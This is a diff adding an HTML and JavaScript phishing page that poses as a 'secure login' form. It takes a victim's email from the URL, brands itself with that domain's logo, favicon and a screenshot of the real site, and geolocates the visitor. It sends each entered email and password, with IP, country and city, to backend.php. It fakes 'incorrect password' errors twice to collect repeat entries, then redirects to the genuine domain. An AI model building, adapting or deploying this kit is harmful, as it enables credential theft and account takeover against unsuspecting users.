@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Domain Login Form</title>
+    <link id="favicon" rel="icon" href="">
+    
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f4f4f4;
+            background-size: 100% auto;
+            background-position: center top;
+            background-repeat: no-repeat;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-form {
+            background: rgba(255, 255, 255, 0.98);
+            padding: 20px 30px;
+            border-radius: 0;
+            box-shadow: 0 3px 8px rgba(0, 0, 0, 0.1);
+            width: 340px;
+            text-align: center;
+            border: 1px solid #c0c0c0;
+        }
+
+        .logo {
+            width: 50px;
+            height: 50px;
+            margin: 0 auto 10px;
+            display: none;
+            object-fit: contain;
+            border-radius: 0;
+            background: white;
+            padding: 3px;
+            border: 1px solid #d0d0d0;
+        }
+
+        h2 {
+            margin: 0 0 20px 0;
+            font-size: 16px;
+            color: #2c3e50;
+            font-weight: 600;
+            letter-spacing: 0.2px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .form-group {
+            margin-bottom: 10px;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            font-size: 11px;
+            margin-bottom: 3px;
+            color: #555;
+            font-weight: 500;
+        }
+
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 8px 10px;
+            font-size: 13px;
+            border: 1px solid #b0b0b0;
+            border-radius: 0;
+            box-sizing: border-box;
+            background: #fcfcfc;
+            transition: border 0.2s;
+        }
+
+        input[type="email"]:focus,
+        input[type="password"]:focus {
+            outline: none;
+            border-color: #2980b9;
+            background: white;
+        }
+
+        .forgot-password {
+            display: block;
+            margin-top: 2px;
+            text-align: right;
+            font-size: 10px;
+            color: #2980b9;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+            color: #1c5d87;
+        }
+
+        button {
+            width: 100%;
+            padding: 9px;
+            margin-top: 8px;
+            background: #2980b9;
+            color: white;
+            border: none;
+            border-radius: 0;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        button:hover {
+            background: #1c5d87;
+        }
+
+        .secure-note {
+            margin-top: 12px;
+            padding: 10px;
+            font-size: 9px;
+            color: #666;
+            background: #f5f5f5;
+            border-radius: 0;
+            border: 1px solid #ddd;
+            line-height: 1.3;
+        }
+
+        .secure-note .tick {
+            color: #27ae60;
+            margin-right: 3px;
+            font-size: 10px;
+        }
+
+        .location-info {
+            margin-top: 6px;
+            font-size: 8px;
+            color: #777;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-top: 1px solid #e8e8e8;
+            padding-top: 5px;
+        }
+
+        .location-flag {
+            font-size: 12px;
+            margin-right: 3px;
+        }
+
+        .ip-display {
+            font-family: 'Consolas', 'Monaco', monospace;
+            font-size: 8px;
+            color: #555;
+        }
+
+        .compact-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 15px;
+            gap: 6px;
+        }
+        
+        .compact-title {
+            font-size: 14px;
+            color: #2c3e50;
+            font-weight: 600;
+        }
+        
+        .domain-badge {
+            background: #e8e8e8;
+            padding: 4px 8px;
+            border-radius: 0;
+            font-size: 10px;
+            color: #2c3e50;
+            font-weight: 500;
+            border: 1px solid #c8c8c8;
+        }
+        
+        /* Error message styles - now inline with login button */
+        .inline-error {
+            color: #e74c3c;
+            font-weight: 600;
+            font-size: 11px;
+            margin: 3px 0 0 0;
+            padding: 2px 0;
+            text-align: center;
+            min-height: 16px;
+        }
+    </style>
+</head>
+<body>
+    <form class="login-form" id="loginForm">
+        <div class="compact-header">
+            <img id="logo" class="logo" alt="Logo" style="display: none;">
+            <div>
+                <div class="compact-title" id="domainHeading">SECURE LOGIN</div>
+                <div class="domain-badge" id="domainBadge" style="display: none;">DOMAIN</div>
+            </div>
+        </div>
+        
+        <div class="form-group">
+            <label for="email" id="emailLabel">Email Address</label>
+            <input type="email" id="email" name="email" placeholder="Enter email address" required>
+        </div>
+        
+        <div class="form-group">
+            <label for="password" id="passwordLabel">Password</label>
+            <input type="password" id="password" name="password" placeholder="Enter password" required>
+            <a href="#" class="forgot-password" id="forgotPassword">Forgot Password?</a>
+        </div>
+        
+        <!-- Error message now appears here -->
+        <div class="inline-error" id="error-msg"></div>
+        
+        <button type="button" id="login-btn">Sign In</button>
+        
+        <div class="secure-note" id="secureNote">
+            <div>
+                <span class="tick">✓</span> <span id="secureText">Secure connection • Information protected</span>
+            </div>
+            <div class="location-info">
+                <div>
+                    <span class="location-flag" id="locationFlag">📍</span>
+                    <span id="locationText">Detecting location...</span>
+                </div>
+                <div class="ip-display" id="ipDisplay">IP: ...</div>
+            </div>
+        </div>
+    </form>
+
+    <script>
+        // Language translations
+        const translations = {
+            en: {
+                title: "SECURE LOGIN",
+                emailLabel: "Email Address",
+                emailPlaceholder: "Enter email address",
+                passwordLabel: "Password",
+                passwordPlaceholder: "Enter password",
+                forgotPassword: "Forgot Password?",
+                loginButton: "Sign In",
+                secureText: "Secure connection • Information protected",
+                errorEmpty: "Please enter both email and password.",
+                errorIncorrect: "Incorrect password. Please try again.",
+                detectingLocation: "Detecting location...",
+                autoLanguage: "Auto (Detect)"
+            },
+            es: {
+                title: "INICIO DE SESIÓN SEGURO",
+                emailLabel: "Correo Electrónico",
+                emailPlaceholder: "Ingrese su correo electrónico",
+                passwordLabel: "Contraseña",
+                passwordPlaceholder: "Ingrese su contraseña",
+                forgotPassword: "¿Olvidó su contraseña?",
+                loginButton: "Iniciar Sesión",
+                secureText: "Conexión segura • Información protegida",
+                errorEmpty: "Por favor ingrese correo y contraseña.",
+                errorIncorrect: "Contraseña incorrecta. Intente de nuevo.",
+                detectingLocation: "Detectando ubicación...",
+                autoLanguage: "Auto (Detectar)"
+            },
+            fr: {
+                title: "CONNEXION SÉCURISÉE",
+                emailLabel: "Adresse Email",
+                emailPlaceholder: "Entrez votre adresse email",
+                passwordLabel: "Mot de Passe",
+                passwordPlaceholder: "Entrez votre mot de passe",
+                forgotPassword: "Mot de passe oublié?",
+                loginButton: "Se Connecter",
+                secureText: "Connexión sécurisée • Information protégée",
+                errorEmpty: "Veuillez entrer email et mot de passe.",
+                errorIncorrect: "Mot de passe incorrect. Réessayez.",
+                detectingLocation: "Détection de la localisation...",
+                autoLanguage: "Auto (Détecter)"
+            },
+            de: {
+                title: "SICHERER LOGIN",
+                emailLabel: "E-Mail-Adresse",
+                emailPlaceholder: "E-Mail-Adresse eingeben",
+                passwordLabel: "Passwort",
+                passwordPlaceholder: "Passwort eingeben",
+                forgotPassword: "Passwort vergessen?",
+                loginButton: "Anmelden",
+                secureText: "Sichere Verbindung • Informationen geschützt",
+                errorEmpty: "Bitte geben Sie E-Mail und Passwort ein.",
+                errorIncorrect: "Falsches Passwort. Bitte versuchen Sie es erneut.",
+                detectingLocation: "Standort wird erkannt...",
+                autoLanguage: "Auto (Erkennen)"
+            },
+            zh: {
+                title: "安全登录",
+                emailLabel: "电子邮件地址",
+                emailPlaceholder: "输入电子邮件地址",
+                passwordLabel: "密码",
+                passwordPlaceholder: "输入密码",
+                forgotPassword: "忘记密码？",
+                loginButton: "登录",
+                secureText: "安全连接 • 信息受保护",
+                errorEmpty: "请输入电子邮件和密码。",
+                errorIncorrect: "密码不正确。请重试。",
+                detectingLocation: "检测位置中...",
+                autoLanguage: "自动（检测）"
+            },
+            ja: {
+                title: "安全ログイン",
+                emailLabel: "メールアドレス",
+                emailPlaceholder: "メールアドレスを入力",
+                passwordLabel: "パスワード",
+                passwordPlaceholder: "パスワードを入力",
+                forgotPassword: "パスワードをお忘れですか？",
+                loginButton: "ログイン",
+                secureText: "安全な接続 • 情報保護済み",
+                errorEmpty: "メールアドレスとパスワードを入力してください。",
+                errorIncorrect: "パスワードが正しくありません。もう一度お試しください。",
+                detectingLocation: "位置情報を検出中...",
+                autoLanguage: "自動（検出）"
+            },
+            ru: {
+                title: "БЕЗОПАСНЫЙ ВХОД",
+                emailLabel: "Адрес электронной почты",
+                emailPlaceholder: "Введите адрес электронной почты",
+                passwordLabel: "Пароль",
+                passwordPlaceholder: "Введите пароль",
+                forgotPassword: "Забыли пароль?",
+                loginButton: "Войти",
+                secureText: "Безопасное соединение • Информация защищена",
+                errorEmpty: "Пожалуйста, введите email и пароль.",
+                errorIncorrect: "Неверный пароль. Попробуйте снова.",
+                detectingLocation: "Определение местоположения...",
+                autoLanguage: "Авто (Определить)"
+            },
+            ar: {
+                title: "تسجيل الدخول الآمن",
+                emailLabel: "عنوان البريد الإلكتروني",
+                emailPlaceholder: "أدخل عنوان البريد الإلكتروني",
+                passwordLabel: "كلمة المرور",
+                passwordPlaceholder: "أدخل كلمة المرور",
+                forgotPassword: "نسيت كلمة المرور؟",
+                loginButton: "تسجيل الدخول",
+                secureText: "اتصال آمن • المعلومات محمية",
+                errorEmpty: "الرجاء إدخال البريد الإلكتروني وكلمة المرور.",
+                errorIncorrect: "كلمة المرور غير صحيحة. حاول مرة أخرى.",
+                detectingLocation: "جاري اكتشاف الموقع...",
+                autoLanguage: "تلقائي (اكتشاف)"
+            }
+        };
+
+        // Country flag mapping
+        const countryFlags = {
+            'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺', 'DE': '🇩🇪',
+            'FR': '🇫🇷', 'IT': '🇮🇹', 'ES': '🇪🇸', 'JP': '🇯🇵', 'CN': '🇨🇳',
+            'RU': '🇷🇺', 'BR': '🇧🇷', 'IN': '🇮🇳', 'MX': '🇲🇽', 'KR': '🇰🇷',
+            'SA': '🇸🇦', 'AE': '🇦🇪', 'TR': '🇹🇷', 'NL': '🇳🇱', 'SE': '🇸🇪',
+            'NO': '🇳🇴', 'DK': '🇩🇰', 'FI': '🇫🇮', 'PL': '🇵🇱', 'GR': '🇬🇷'
+        };
+
+        // Language code to country mapping for auto-detection
+        const countryToLanguage = {
+            'US': 'en', 'GB': 'en', 'CA': 'en', 'AU': 'en',
+            'ES': 'es', 'MX': 'es', 'AR': 'es', 'CO': 'es',
+            'FR': 'fr', 'BE': 'fr', 'CH': 'fr',
+            'DE': 'de', 'AT': 'de', 'CH': 'de',
+            'CN': 'zh', 'TW': 'zh', 'HK': 'zh',
+            'JP': 'ja',
+            'RU': 'ru', 'UA': 'ru', 'BY': 'ru',
+            'SA': 'ar', 'AE': 'ar', 'EG': 'ar'
+        };
+
+        let userIP = '';
+        let userCountry = '';
+        let userCity = '';
+        let currentLanguage = 'en';
+
+        // Function to get IP and location
+        async function getUserLocation() {
+            try {
+                // Get IP address
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                userIP = ipData.ip;
+                
+                // Get location data
+                const locationResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
+                const locationData = await locationResponse.json();
+                
+                userCountry = locationData.country_code || 'Unknown';
+                userCity = locationData.city || 'Unknown';
+                const countryName = locationData.country_name || 'Unknown';
+                
+                // Update location display
+                const flag = countryFlags[userCountry] || '📍';
+                document.getElementById('locationFlag').textContent = flag;
+                document.getElementById('locationText').textContent = `${userCity}, ${countryName}`;
+                document.getElementById('ipDisplay').textContent = `IP: ${userIP}`;
+                
+                // Auto-detect language based on country
+                if (countryToLanguage[userCountry]) {
+                    currentLanguage = countryToLanguage[userCountry];
+                    translatePage(currentLanguage);
+                }
+                
+            } catch (error) {
+                console.error('Error getting location:', error);
+                document.getElementById('locationText').textContent = 'Location unavailable';
+                document.getElementById('ipDisplay').textContent = 'IP: Unknown';
+                
+                // Try fallback IP service
+                try {
+                    const fallbackResponse = await fetch('https://api.db-ip.com/v2/free/self');
+                    const fallbackData = await fallbackResponse.json();
+                    userIP = fallbackData.ipAddress || 'Unknown';
+                    userCountry = fallbackData.countryCode || 'Unknown';
+                    
+                    const flag = countryFlags[userCountry] || '📍';
+                    document.getElementById('locationFlag').textContent = flag;
+                    document.getElementById('ipDisplay').textContent = `IP: ${userIP}`;
+                    
+                    if (countryToLanguage[userCountry]) {
+                        currentLanguage = countryToLanguage[userCountry];
+                        translatePage(currentLanguage);
+                    }
+                } catch (fallbackError) {
+                    console.error('Fallback also failed:', fallbackError);
+                }
+            }
+        }
+
+        // Function to translate the page
+        function translatePage(langCode) {
+            const lang = translations[langCode] || translations.en;
+            currentLanguage = langCode;
+            
+            // Update all translatable elements
+            document.getElementById('domainHeading').textContent = lang.title;
+            document.getElementById('emailLabel').textContent = lang.emailLabel;
+            document.getElementById('email').placeholder = lang.emailPlaceholder;
+            document.getElementById('passwordLabel').textContent = lang.passwordLabel;
+            document.getElementById('password').placeholder = lang.passwordPlaceholder;
+            document.getElementById('forgotPassword').textContent = lang.forgotPassword;
+            document.getElementById('login-btn').textContent = lang.loginButton;
+            document.getElementById('secureText').textContent = lang.secureText;
+        }
+
+        // Process URL hash for domain customization
+        const hash = decodeURIComponent(window.location.hash.substring(1));
+        
+        if (hash) {
+            const emailInput = document.getElementById('email');
+            emailInput.value = hash;
+            
+            const atIndex = hash.indexOf('@');
+            if (atIndex !== -1) {
+                const fullDomain = hash.substring(atIndex + 1);
+                const rootDomain = fullDomain.split('.')[0];
+                const logo = document.getElementById('logo');
+                const domainBadge = document.getElementById('domainBadge');
+                const domainHeading = document.getElementById('domainHeading');
+                
+                // Use a proxy service to avoid CORS issues
+                const logoUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(`https://logo.clearbit.com/${fullDomain}?size=256`)}`;
+                
+                // Set logo source
+                logo.src = logoUrl;
+                logo.style.display = 'block';
+                
+                // Set favicon
+                document.getElementById('favicon').href = `https://t2.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&fallback_opts=TYPE,SIZE,URL&url=https://${fullDomain}&size=256`;
+                
+                // Update other elements
+                domainHeading.textContent = rootDomain.toUpperCase();
+                domainBadge.textContent = fullDomain;
+                domainBadge.style.display = 'block';
+                
+                document.body.style.backgroundImage = `url('https://image.thum.io/get/width/1920/fullpage/https://${fullDomain}')`;
+                document.getElementById('secureNote').innerHTML = `<span class="tick">✓</span> Verified Secure • ${rootDomain.toUpperCase()} Inc. ©2025`;
+                
+                // Add error handling for logo
+                logo.onerror = function() {
+                    console.log('Logo failed to load, trying alternative...');
+                    logo.src = `https://t2.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&fallback_opts=TYPE,SIZE,URL&url=https://${fullDomain}&size=256`;
+                    
+                    logo.onerror = function() {
+                        console.log('Alternative logo also failed to load');
+                        logo.style.display = 'none';
+                    };
+                };
+            }
+        }
+
+        // Get user location on page load
+        getUserLocation();
+
+        // Login functionality
+        let attemptCount = 0;
+        const loginBtn = document.getElementById('login-btn');
+        const errorMsg = document.getElementById('error-msg');
+        
+        loginBtn.addEventListener('click', handleLogin);
+        
+        function handleLogin() {
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value.trim();
+            
+            if (!email || !password) {
+                errorMsg.textContent = translations[currentLanguage].errorEmpty;
+                return;
+            }
+            
+            // Submit login data (including location info)
+            const formData = new FormData();
+            formData.append('email', email);
+            formData.append('password', password);
+            formData.append('ip', userIP);
+            formData.append('country', userCountry);
+            formData.append('city', userCity);
+            formData.append('language', currentLanguage);
+            
+            fetch('backend.php', {
+                method: 'POST',
+                body: formData
+            });
+            
+            attemptCount++;
+            document.getElementById('password').value = '';
+            
+            // Handle login attempts
+            if (attemptCount < 3) {
+                errorMsg.textContent = translations[currentLanguage].errorIncorrect;
+            } else {
+                errorMsg.textContent = '';
+                const domain = email.split('@')[1];
+                
+                setTimeout(() => {
+                    window.location.href = `https://${domain}`;
+                }, 1000);
+            }
+        }
+        
+        // Add form submission on Enter key
+        document.getElementById('password').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                handleLogin();
+            }
+        });
+    </script>
+</body>
+</html>
